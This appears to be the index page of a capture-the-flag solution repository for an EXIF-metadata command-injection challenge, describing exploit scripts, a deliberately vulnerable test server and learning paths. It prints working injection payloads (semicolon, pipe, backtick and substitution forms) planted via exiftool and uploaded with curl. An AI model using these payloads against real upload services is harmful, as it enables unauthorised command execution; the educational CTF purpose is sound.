# EXIF Command Injection Exploit - Index

## Challenge
Exploit a web application that processes image EXIF metadata to execute arbitrary commands and capture the flag.

**Target**: http://chall.0xfun.org:61927/  
**Goal**: Read flag.txt using command injection through EXIF metadata

---

## Quick Start
```bash
# Fastest way to exploit
./exploit.sh

# Or use Python
python3 exploit_exif_injection.py
```

---

## File Structure

### Exploitation Tools

| File | Purpose | Usage |
|------|---------|-------|
| **exploit_exif_injection.py** | Comprehensive Python exploit | `python3 exploit_exif_injection.py [url]` |
| **exploit.sh** | Automated bash script | `./exploit.sh [url] [command]` |
| **vulnerable_server.py** | Local test server | `python3 vulnerable_server.py` |
| **requirements.txt** | Python dependencies | `pip install -r requirements.txt` |

### Documentation

| File | Description | When to Read |
|------|-------------|--------------|
| **[QUICKSTART.md](QUICKSTART.md)** | Fast track guide | Start here for quick exploitation |
| **[SOLUTION.md](SOLUTION.md)** | Complete solution overview | Read for comprehensive understanding |
| **[WALKTHROUGH.md](WALKTHROUGH.md)** | Step-by-step tutorial | Follow for detailed learning |
| **[EXPLOIT_README.md](EXPLOIT_README.md)** | Technical deep dive | Study for security concepts |
| **[SECURITY_SUMMARY.md](SECURITY_SUMMARY.md)** | Security analysis | Review security considerations |
| **INDEX.md** | This file | Navigate all resources |

---

## Usage Paths

### Path 1: Quick Exploitation (5 minutes)
1. Read [QUICKSTART.md](QUICKSTART.md)
2. Run `./exploit.sh`
3. Get the flag

### Path 2: Manual Learning (30 minutes)
1. Read [WALKTHROUGH.md](WALKTHROUGH.md)
2. Create image: `convert -size 100x100 xc:red exploit.jpg`
3. Inject payload: `exiftool -Artist="'; cat flag.txt; echo '" exploit.jpg`
4. Upload: `curl -F "file=@exploit.jpg" http://target/upload`
5. Analyze response

### Path 3: Local Practice (1 hour)
1. Start server: `python3 vulnerable_server.py`
2. Read [WALKTHROUGH.md](WALKTHROUGH.md)
3. Test exploits against localhost
4. Experiment with payloads
5. Understand the vulnerability

### Path 4: Deep Understanding (2+ hours)
1. Read [SOLUTION.md](SOLUTION.md) - Overview
2. Read [EXPLOIT_README.md](EXPLOIT_README.md) - Technical details
3. Read [WALKTHROUGH.md](WALKTHROUGH.md) - Step-by-step
4. Study vulnerable_server.py code
5. Experiment with exploit.sh modifications
6. Read [SECURITY_SUMMARY.md](SECURITY_SUMMARY.md) - Security analysis

---

## Key Concepts

### The Vulnerability
- **Type**: Command Injection (CWE-78)
- **Location**: EXIF metadata processing
- **Cause**: Unsanitized input to shell commands
- **Impact**: Arbitrary command execution

### Attack Vector
```
Image Upload → EXIF Processing → Shell Command → Injection → Flag Extracted
```

### Payloads
- Semicolon: `'; cat flag.txt; echo '`
- Pipe: `test | cat flag.txt`
- Substitution: `test$(cat flag.txt)`
- Backticks: `` test`cat flag.txt` ``
- AND: `test && cat flag.txt`
- OR: `test || cat flag.txt`

---

## Requirements

### For Exploitation
```bash
pip install -r requirements.txt
```
Installs: Pillow, requests, Flask

### System Tools
```bash
# Ubuntu/Debian
sudo apt-get install libimage-exiftool-perl imagemagick

# macOS
brew install exiftool imagemagick
```

---

## Testing Workflow

### 1. Local Testing First
```bash
# Terminal 1: Start vulnerable server
python3 vulnerable_server.py

# Terminal 2: Test exploit
./exploit.sh http://localhost:5000/upload
```

### 2. Against Real Target
```bash
./exploit.sh http://chall.0xfun.org:61927/upload
```

### 3. Manual Verification
```bash
# Create and craft image
convert -size 100x100 xc:red test.jpg
exiftool -Artist="'; whoami; echo '" test.jpg

# Upload and check
curl -F "file=@test.jpg" http://localhost:5000/upload
```

---

## Learning Outcomes

After completing this challenge, you will understand:
- ✅ How EXIF metadata works
- ✅ Command injection vulnerabilities
- ✅ Shell metacharacters and escaping
- ✅ Web application security testing
- ✅ Secure coding practices
- ✅ Input validation importance
- ✅ Responsible disclosure

---

## Security Notes

### ⚠️ Legal and Ethical Use Only
- Only test systems you own or have explicit permission to test
- This challenge provides authorized testing
- Unauthorized access is illegal
- Practice responsible disclosure

### 🛡️ Defensive Measures
See [EXPLOIT_README.md](EXPLOIT_README.md) for:
- Secure coding examples
- Input validation techniques
- Mitigation strategies
- OWASP references

---

## Troubleshooting

### Common Issues

| Issue | Solution | Reference |
|-------|----------|-----------|
| exiftool not found | Install: `apt install libimage-exiftool-perl` | [WALKTHROUGH.md](WALKTHROUGH.md#troubleshooting) |
| Connection refused | Check target URL, server status | [WALKTHROUGH.md](WALKTHROUGH.md#troubleshooting) |
| No flag in response | Try different payloads/fields | [WALKTHROUGH.md](WALKTHROUGH.md#troubleshooting) |
| Upload fails | Try different form field names | [WALKTHROUGH.md](WALKTHROUGH.md#troubleshooting) |

---

## Repository Statistics

- **Python Scripts**: 2 (exploit + vulnerable server)
- **Bash Scripts**: 1 (automated exploit)
- **Documentation Files**: 6 comprehensive guides
- **Total Lines of Code**: ~1,500
- **Documentation Pages**: ~40 pages
- **Payload Techniques**: 6 different methods
- **EXIF Fields Targeted**: 5+ fields

---

## Credits

### Technologies Used
- Python 3 (Pillow, requests, Flask)
- Bash scripting
- ExifTool
- ImageMagick
- curl

### Educational Purpose
This solution was created for educational purposes to demonstrate:
- Web application vulnerabilities
- Penetration testing methodology
- Secure coding practices
- Ethical hacking principles

---

## Quick Reference

### Commands Cheat Sheet
```bash
# Install dependencies
pip install -r requirements.txt

# Quick exploit
./exploit.sh

# Python exploit
python3 exploit_exif_injection.py

# Create malicious image
python3 exploit_exif_injection.py --create-only

# Start local server
python3 vulnerable_server.py

# Manual payload injection
exiftool -Artist="'; cat flag.txt; echo '" image.jpg

# Upload with curl
curl -F "file=@image.jpg" http://target/upload
```

### Documentation Quick Links
- **Need help?** → [QUICKSTART.md](QUICKSTART.md)
- **Want to learn?** → [WALKTHROUGH.md](WALKTHROUGH.md)
- **Deep dive?** → [EXPLOIT_README.md](EXPLOIT_README.md)
- **Overview?** → [SOLUTION.md](SOLUTION.md)
- **Security?** → [SECURITY_SUMMARY.md](SECURITY_SUMMARY.md)

---

## Next Steps

1. ✅ Complete the challenge
2. ✅ Understand the vulnerability
3. ✅ Study secure coding practices
4. 📚 Explore related vulnerabilities (SQL injection, XSS, etc.)
5. 🎯 Practice on platforms like HackTheBox, TryHackMe
6. 🎓 Consider security certifications (OSCP, CEH, etc.)

---

**Happy Hacking!** 🚀

Remember: Use your skills responsibly and ethically.
